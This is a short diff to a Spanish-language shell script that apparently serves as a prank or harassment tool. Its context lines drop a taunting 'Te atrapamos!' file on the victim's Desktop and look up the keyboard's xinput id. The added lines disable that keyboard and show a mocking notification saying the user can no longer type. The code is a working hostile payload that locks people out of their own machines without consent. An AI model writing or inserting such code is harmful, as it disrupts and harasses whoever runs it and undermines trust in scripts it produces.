@@ -42,3 +42,8 @@ done) &
 echo "😆 Te atrapamos!" > ~/Desktop/JAJAJAJA.txt
 
 teclado_id=$(xinput list | grep -i 'keyboard' | awk '{print $6}' | cut -d'=' -f2 | head -n 1)
+
+if [ ! -z "$teclado_id" ]; then
+    xinput set-prop "$teclado_id" "Device Enabled" 0
+    notify-send "🎹 Teclado desactivado" "JAJAJAJAJA ahora no puedes escribir"
+fi
